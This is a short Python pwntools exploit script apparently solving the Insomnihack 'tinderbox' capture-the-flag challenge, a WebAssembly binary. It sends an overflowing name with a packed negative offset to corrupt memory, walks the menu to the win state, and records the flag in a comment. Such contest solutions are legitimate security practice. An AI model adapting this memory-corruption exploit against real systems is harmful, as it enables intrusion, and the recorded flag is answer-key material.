#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import struct

context.log_level = logging.DEBUG

io = remote('tinderbox.insomnihack.ch', 7171)
# io = process('wasmtime bin.wasm', shell=True)

name = b'A'*16 + struct.pack('i', -16-28)

io.sendlineafter(b'name:', name)
io.sendlineafter(b'oke!\n', b'1')

io.sendline(b'32')
io.sendlineafter(b'oke!\n', b'3')

io.recvall()

# INS{L00k_mUm!W1th0ut_toUch1ng_RIP!}